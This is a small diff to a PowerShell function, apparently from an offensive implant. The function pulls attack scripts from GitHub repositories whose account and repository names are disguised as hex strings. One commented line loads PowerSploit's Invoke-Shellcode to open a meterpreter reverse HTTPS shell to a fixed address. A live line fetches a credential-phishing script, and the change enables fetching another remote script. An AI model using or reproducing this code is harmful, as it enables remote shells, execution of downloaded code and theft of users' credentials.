@@ -19,5 +19,5 @@ function FetchCommands
 {
   #IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.10 -Lport 1111 -Force 
   ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/credphish.ps1'))
-  #((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/demo.ps1'))
+  ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/237a25023644904225942656096401ae/2d298d9ee45a55cdeb62c9a060a1267f/master/Tools/demo.ps1'))
 }
